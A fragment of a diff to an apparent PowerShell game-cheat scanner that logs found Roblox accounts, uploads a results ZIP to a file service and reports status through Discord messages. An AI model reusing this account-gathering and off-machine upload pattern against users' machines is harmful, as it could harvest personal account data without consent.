+        @{ name = "Status"; value = if ($isSuspicious) { "SUSPICIOUS" } else { "Clean" }; inline = $true }
+        @{ name = "Local Folder"; value = $outputDir; inline = $false }
+    )
+    
+    $embed = @{
+        title = "⚠️ Upload Failed"
+        description = "Scan completed but file upload failed. Results saved locally only."
+        color = 15158332
+        fields = $fields
+        timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
+    }
+    
+    Send-DiscordMessage -Content "**Upload Failed - Scan Complete**" -Embeds @($embed)
 }
 
+# Clean up temp ZIP
 Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
 
 # ============================================================================
@@ -881,12 +1055,15 @@ Write-Log "`n$(Get-Separator)" "Cyan"
 Write-Log "SCAN COMPLETE!" "Green"
 Write-Log "Status: $(if ($isSuspicious) { '⚠️ SUSPICIOUS' } else { '✓ CLEAN' })" $(if ($isSuspicious) { "Red" } else { "Green" })
 Write-Log "Pattern Matches: $($patternMatches.Count)" "Cyan"
-Write-Log "Results: $outputDir" "Cyan"
+Write-Log "Roblox Accounts: $($robloxAccounts.Count)" "Cyan"
+Write-Log "Results folder: $outputDir" "Cyan"
 if ($uploadResult) {
-    Write-Log "Download: $($uploadResult.url)" "Cyan"
+    Write-Log "Download link: $($uploadResult.url)" "Cyan"
+    Write-Log "Service: $($uploadResult.service) | Expires: $($uploadResult.expiry)" "Yellow"
 }
 Write-Log "$(Get-Separator)" "Cyan"
 
+# Open results folder
 Start-Process explorer.exe $outputDir
 
 Write-Host "`nPress any key to exit..." -ForegroundColor Yellow
